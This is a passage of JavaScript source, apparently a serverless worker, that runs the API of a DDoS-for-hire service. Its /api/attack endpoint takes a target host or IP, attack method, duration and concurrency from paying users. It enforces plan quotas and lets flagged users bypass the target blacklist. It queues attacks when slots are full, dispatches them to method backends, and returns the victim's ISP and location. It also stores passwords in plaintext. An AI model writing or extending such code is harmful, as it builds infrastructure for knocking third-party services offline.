    // ENDPOINT: /api/attack - Initiate DDoS attack or queue it if all slots are full
    // Auth: Username + Password OR Discord Link + BOT_API_KEY (bearer token)
    // Required Parameters: username, password (or BOT_API_KEY), host/ip, method
    // Optional Parameters: time (duration), concurrents, rps, threads, len (payload size), port, geo
    // Returns: 
    //   - 200 OK with attack ID if executed immediately
    //   - 202 ACCEPTED if queued (all slots full)
    //   - 40x error if validation fails, rate limited, or account suspended
    // Rate Limiting: 1 second between attacks per user (bypass with bypass_anti_spam=true)
    // Queue: Attacks queued when GLOBAL_API_SLOTS exhausted, processed when slots available
    
    const attackStartTime = performance.now(); // Start timing
    const qv = parseQuery(request);
    const authHeader = (request.headers && request.headers.get ? request.headers.get('Authorization') : null) || '';
    const bearer = authHeader.startsWith('Bearer ') ? authHeader.slice(7).trim() : '';
    let botAuth = false;
    // If caller presents the BOT_API_KEY and provides a discord_user_id, allow acting on behalf of the linked user without password
    if (bearer && env.BOT_API_KEY && bearer === String(env.BOT_API_KEY)) {
      const discordId = qv.discord_user_id || qv.discord_id || qv.discord;
      if (discordId) {
        const link = await Vault.getVerifiedDiscordLinkByDiscordId(env, discordId);
        if (link && link.username) {
          qv.username = link.username;
          botAuth = true;
        }
      }
    }
    const record = {
      username: qv.username || null,
      target: qv.host || qv.ip || null,
      port: qv.port || '80',
      method: (qv.method || 'udp').toLowerCase(),
      duration: Number(qv.time || 60),
      concurrents: Number(qv.concurrents || 1),
      rps: Number(qv.rps || 0),
      threads: Number(qv.threads || 0),
      len: validatePayloadLength(qv.len),
      geo: qv.geo || null,
      created_at: new Date().toISOString()
    };

    const user = record.username ? await Vault.getUser(env, record.username) : null;
    if (!user || user.username !== record.username) return makePolishedError('user does not exist', 404, { hint: 'Verify the username supplied in the request.' });

    // If not bot-authenticated, require password parameter and validate credentials
    if (!botAuth) {
      const providedPassword = (qv.password || qv.pass || '').toString();
      if (!providedPassword) return makePolishedError('missing credentials', 401, { hint: 'Provide username and password in the request.' });
      // Note: Vault stores the password in the `password` field. Adjust if passwords are hashed.
      if (String(user.password || '') !== providedPassword) return makePolishedError('invalid credentials', 401, { hint: 'Username or password is incorrect.' });
    }

    const userWarnings = await Vault.getUserWarnings(env, user.username);
    if (user.suspended || userWarnings.suspended || userWarnings.count >= userWarnings.limit) {
      return makePolishedError('account suspended', 403, { suspended: true, warn_status: `${userWarnings.count}/${userWarnings.limit}`, hint: 'This account is suspended. Contact an administrator to restore access.' });
    }
    if (!user.api_access) return makePolishedError('user has no API access', 403, { hint: 'Enable API access for this account before trying again.' });

    // Check if attacks are globally disabled
    const attacksDisabled = await Vault.getAttacksDisabled(env);
    if (attacksDisabled) {
      return makePolishedError('Attacks are currently disabled', 503, { hint: 'All attacks have been disabled by administrators. Please try again later.' });
    }

    if (!ALLOWED_METHODS[record.method]) return makePolishedError(`method ${record.method} is not supported`, 400, { hint: 'Use one of the supported attack methods listed by the methods catalog.' });
    const expects = ALLOWED_METHODS[record.method];
    const payloadMethods = getPayloadMethods();
    const methodsCatalog = await Vault.listMethods(env);
    const methodNames = (methodsCatalog || []).map(m => (m.name || '').toLowerCase());
    if (!methodNames.includes(record.method)) {
      await Vault.addMethod(env, { name: record.method, description: `${record.method} method` });
    }

    const targetType = ((payloadMethods.find(m => (m.name || '').toLowerCase() === record.method) || null)?.target_type || expects || 'ip').toLowerCase();
    const targetProvided = String(record.target || '').trim();

    if (targetType === 'ip' && !isIPv4(targetProvided)) {
      return makePolishedError(`method ${record.method} requires an IP target`, 400, { hint: 'Provide a valid IPv4 address as the target for this method.' });
    }
    if (targetType === 'url' && !isUrlTarget(targetProvided)) {
      return makePolishedError(`method ${record.method} requires a host or URL target`, 400, { hint: 'Provide a valid hostname or URL for this method.' });
    }

    // Validate target is not private/reserved (additional security check)
    if (!isValidTarget(targetProvided)) {
      const reason = isPrivateIPRange(targetProvided) ? 'private/reserved IP range' : 'reserved or invalid domain';
      return makePolishedError(`target is not allowed (${reason})`, 400, { hint: 'Use a public IP address or domain that is not reserved or private.' });
    }

    const methodMeta = payloadMethods.find(m => (m.name || '').toLowerCase() === record.method) || (methodsCatalog || []).find(m => (m.name || '').toLowerCase() === record.method) || null;
    const policyResult = isMethodPermittedForUser(user, methodMeta);
    if (!policyResult.allowed) return makePolishedError(`method ${record.method} is blocked by policy (${policyResult.reason})`, 403, { hint: 'Upgrade the account plan or remove the policy restriction for this method.' });

    const allowedMethods = user.allowed_methods ? user.allowed_methods.split(',').map(s => s.trim().toLowerCase()).filter(Boolean) : [];
    if (allowedMethods.length > 0 && !allowedMethods.includes(record.method)) return makePolishedError(`method ${record.method} is not permitted for this user`, 403, { hint: 'Ask an admin to grant this method to the account.' });

    const payloadBlacklists = getPayloadBlacklists();
    const ipinfo = await ipLookup(record.target) || {};
    const blacklistRows = await Vault.listBlacklist(env);
    const blacklistTargets = [
      ...(payloadBlacklists?.Blacklists_Targets || []),
      ...(blacklistRows || []).map(item => item.target)
    ];
    const targetBlocked = isBlacklistedTarget(record.target, blacklistTargets)
      || isBlacklistedByMetadata(ipinfo, payloadBlacklists);
    if (targetBlocked) {
      // Check if user has bypass_blacklist enabled
      if (!user.bypass_blacklist) {
        const warning = await Vault.incrementUserWarning(env, record.username, record.target);
        return makePolishedError('blacklisted target', 403, {
          target: record.target,
          target_asn: ipinfo.as || ipinfo.org || null,
          target_country: ipinfo.country || null,
          target_country_code: ipinfo.countryCode || null,
          warn_status: `${warning.count}/5`,
          suspended: warning.suspended,
          hint: 'This target is blocked by policy and cannot be used again until the block is cleared.'
        });
      }
      // User has bypass_blacklist - log but allow the attack
      console.warn(`⚠️ User ${record.username} bypassed blacklist for target ${record.target}`);
    }

    if (user.allowed_targets) {
      const list = user.allowed_targets.split(',').map(s => s.trim()).filter(Boolean);
      const ok = list.some(a => {
        if (a === record.target) return true;
        if (a.endsWith('.') && record.target.startsWith(a)) return true;
        return false;
      });
      if (!ok) return makePolishedError(`target not allowed for this user; allowed: ${list.join(',')}`, 403, { hint: 'Use an approved target from the account allow-list.' });
    }

    const limits = getUserLimits(user);
    const methodMinTime = Number(methodMeta?.min_time || 0);
    const methodMaxTime = Number(methodMeta?.max_time || 0);
    const effectiveMinTime = Math.max(limits.minTime, methodMinTime || 0);
    const effectiveMaxTime = methodMaxTime > 0 ? Math.min(limits.maxTime, methodMaxTime) : limits.maxTime;

    if (effectiveMaxTime > 0 && effectiveMinTime > effectiveMaxTime) {
      return makePolishedError(`cannot use method ${record.method} with current plan time limits`, 400, { hint: `This method requires a minimum time of ${methodMinTime}s, but your account max time is ${limits.maxTime}s.` });
    }
    if (record.duration < effectiveMinTime) {
      return makePolishedError(`requested time is below the minimum allowed time of ${effectiveMinTime}`, 400, { hint: `Increase the duration to at least ${effectiveMinTime} seconds for this method and plan.` });
    }
    if (effectiveMaxTime > 0 && record.duration > effectiveMaxTime) {
      return makePolishedError(`requested time exceeds the maximum allowed time of ${effectiveMaxTime}`, 400, { hint: `Lower the duration to ${effectiveMaxTime} seconds or less for this method and plan.` });
    }

    const todays = await Vault.countUserDailyAttacks(env, record.username);
    if (user.max_daily_attacks && todays >= (user.max_daily_attacks || 0)) return makePolishedError('max daily attacks exceeded', 429, { hint: 'Wait until the daily quota resets or ask for a higher daily limit.' });

    const userOngoing = await Vault.countUserOngoing(env, record.username);
    if ((userOngoing + record.concurrents) > limits.maxConcurrents) return makePolishedError(`requested concurrents would exceed user's allowed concurrents of ${limits.maxConcurrents} (current running: ${userOngoing})`, 400, { hint: 'Lower the concurrency value or wait for running attacks to finish.' });

    const methodMaxSlots = Number(methodMeta?.max_slots || 0);
    // Check if method has reached its max slots and handle queuing
    if (methodMaxSlots > 0) {
      const methodOngoing = await Vault.countMethodOngoing(env, record.method);
      if (methodOngoing >= methodMaxSlots) {
        // Queue the attack instead of rejecting
        const queuePosition = await Vault.queueAttack(env, record, 'method_slots_full');
        return jsonResponse({
          error: false,
          status: 202,
          message: `✅ Attack queued! Your request is #${queuePosition} in the queue for ${record.method} method.`,
          data: {
            queued: true,
            queue_position: queuePosition,
            queue_reason: 'Method at maximum concurrent attacks',
            target: record.target,
            method: record.method,
            hint: `There are ${methodOngoing} active ${record.method} attacks. Your request will be executed as soon as a slot becomes available.`
          }
        }, 202);
      }
    }

    // Check global API slots
    const ongoing = await Vault.countOngoing(env);
    const userBypass = Boolean(user.bypass_slots || 0);
    if (!userBypass && ongoing >= GLOBAL_API_SLOTS) {
      // Queue the attack when global API slots are full (unless user has bypass)
      const queuePosition = await Vault.queueAttack(env, record, 'api_slots_full');
      return jsonResponse({
        error: false,
        status: 202,
        message: `✅ Attack queued! Your request is #${queuePosition} in the queue due to high API load.`,
        data: {
          queued: true,
          queue_position: queuePosition,
          queue_reason: 'API at maximum global concurrent attacks',
          target: record.target,
          method: record.method,
          global_slots_status: `${ongoing}/${GLOBAL_API_SLOTS}`,
          hint: `All ${GLOBAL_API_SLOTS} global API slots are in use. Your request will execute as soon as a slot becomes available.`
        }
      }, 202);
    }

    await Vault.addLog(env, record);
    await Vault.addOngoingAttack(env, record);

    const apiLinkExecutions = await fanOutMethodApiLinks(methodMeta, record);

    const attacks_remaining = Math.max(0, Number(user.max_daily_attacks || 0) - Number(todays || 0));
    const ongoing_now = await Vault.countOngoing(env);
    const serviceName = await resolveServiceName(user, env, env.API_NAME || 'CAPI');
    const attackEndTime = performance.now(); // End timing
    const executionTime = attackEndTime - attackStartTime; // Calculate execution time
    const attackId = generateAttackId(); // Generate unique attack ID
    const powerSaving = Boolean(user.power_saving || 1); // Default true (enabled)
    const bypassPower = !powerSaving; // Inverse of power_saving
    
    const responseBody = {
      error: false,
      message: 'attack accepted',
      data: {
        attack_id: attackId,
        target: record.target,
        port: Number(record.port),
        method: record.method,
        time_used: Number(record.duration),
        len: Number(record.len),
        threads: Number(record.threads || 0),
        rps: Number(record.rps || 0),
        geo: record.geo || 'full',
        target_asn: ipinfo.as || ipinfo.org || null,
        target_city: ipinfo.city || null,
        target_country: ipinfo.country || null,
        target_country_code: ipinfo.countryCode || null,
        target_isp: ipinfo.isp || null,
        target_org: ipinfo.org || null,
        target_region: ipinfo.regionName || ipinfo.region || null,
        target_timezone: ipinfo.timezone || null,
        target_zip: ipinfo.zip || null,
        username: user.username || qv.username || 'anon',
        max_time: Number(user.max_time || 60),
        min_time: Number(user.min_time || 30),
        max_concurrents: Number(user.concurrents || 1),
        method_max_slots: Number(methodMeta?.max_slots || 0),
        method_active_slots: Number(await Vault.countMethodOngoing(env, record.method)),
        cooldown: Number(user.cooldown || 10),
        attacks_remaining: attacks_remaining,
        bypass_slots: Boolean(user.bypass_slots || 0),
        holder_status: Boolean(user.holder),
        vip_status: Boolean(user.vip),
        api_status: Boolean(user.api_access),
        admin_status: Boolean(user.admin),
        power_saving: powerSaving,
        bypass_power: bypassPower,
        time_to_send: `${executionTime.toFixed(6)}ms`
      }
    };

    return jsonResponse(responseBody, 200, { service: serviceName });
  }

  if (endpoint === 'stop') {
    return jsonResponse({ error: false, kill_id: 1 });
  }

  /**
   * Queue Status Endpoint - Check if user has queued attacks and their position
   * Requires: username and password
   * Returns: List of queued attacks with position and estimated wait time
   */
  if (endpoint === 'queue_status') {
    const q = parseQuery(request.url);
    const requestUser = q.username;
    const requestPass = q.password;
    
    if (!requestUser || !requestPass) {
      return makePolishedError('queue_status requires username and password', 400);
    }

    const user = await Vault.getUser(env, requestUser);
    if (!user || user.password !== requestPass) {
      return makePolishedError('Invalid username or password', 401);
    }

    // Check rate limiting
    const rateLimitCheck = checkApiRateLimit(`user:${requestUser}`, 3);
    if (!rateLimitCheck.allowed) {
      return makePolishedError(`Rate limited. Try again in ${rateLimitCheck.secondsUntilAvailable.toFixed(1)}s`, 429);
    }

    try {
      const queuedAttacks = await Vault.getQueuedAttacks(env, requestUser);
      const totalQueueLength = await Vault.getQueueLength(env);
      const averageExecutionTime = 45; // seconds - estimated average attack duration
      
      const queueData = (queuedAttacks || []).map((qa, idx) => ({
        position: qa.position,
        target: qa.target,
        method: qa.method,
        port: qa.port,
        duration: qa.duration,
        queued_at: qa.queued_at,
        queue_reason: qa.reason,
        estimated_wait_seconds: Math.max(0, (qa.position - 1) * averageExecutionTime),
        estimated_wait_formatted: `~${Math.ceil((qa.position - 1) * averageExecutionTime / 60)}m`
      }));

      return jsonResponse({
        error: false,
        data: {
          username: requestUser,
          has_queued_attacks: queuedAttacks && queuedAttacks.length > 0,
          queued_count: queuedAttacks ? queuedAttacks.length : 0,
          global_queue_length: totalQueueLength,
          queued_attacks: queueData,
          hint: queuedAttacks && queuedAttacks.length > 0 
            ? `You have ${queuedAttacks.length} queued attack(s). Position #${queuedAttacks[0].position} is being executed next.`
            : 'You have no queued attacks right now.'
        }
      }, 200, { service: serviceName });
    } catch (error) {
      return makePolishedError(`Error retrieving queue status: ${error.message}`, 500);
    }
  }

  return routeNotFound();
}
